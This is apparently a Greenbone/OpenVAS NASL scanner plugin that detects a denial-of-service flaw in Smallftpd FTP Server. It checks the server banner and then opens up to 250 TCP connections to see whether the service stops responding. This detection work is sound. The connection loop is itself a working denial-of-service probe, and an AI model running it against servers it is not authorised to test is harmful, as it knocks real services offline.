# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902453");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2011-07-01 16:09:45 +0200 (Fri, 01 Jul 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Smallftpd FTP Server Multiple Requests Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/smallftpd/detected");

  script_xref(name:"URL", value:"http://www.1337day.com/exploits/16423");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17455/");

  script_tag(name:"impact", value:"Successful exploitation will allow unauthenticated attackers to
  cause a denial of service.");

  script_tag(name:"affected", value:"Smallftpd version 1.0.3-fix and prior.");

  script_tag(name:"insight", value:"The flaw is due to an error when handling the multiple requests
  from the client. It is unable to handle multiple connections regardless of its maximum connection settings.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Smallftpd FTP Server is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

ftpPort = ftp_get_port(default:21);
banner = ftp_get_banner(port:ftpPort);
if(!banner || "220- smallftpd" >!< banner){
  exit(0);
}

soc = open_sock_tcp(ftpPort);
if(!soc){
  exit(0);
}

banner = ftp_recv_line(socket:soc);
ftp_close(socket:soc);
if(!banner || "220- smallftpd" >!< banner){
  exit(0);
}

## Open the multiple sockets on port 21. if it fails exit
for(i=0; i<250; i++)
{
  soc = open_sock_tcp(ftpPort);
  if(!soc)
  {
    security_message(port:ftpPort);
    exit(0);
  }
}

ftp_close(socket:soc);
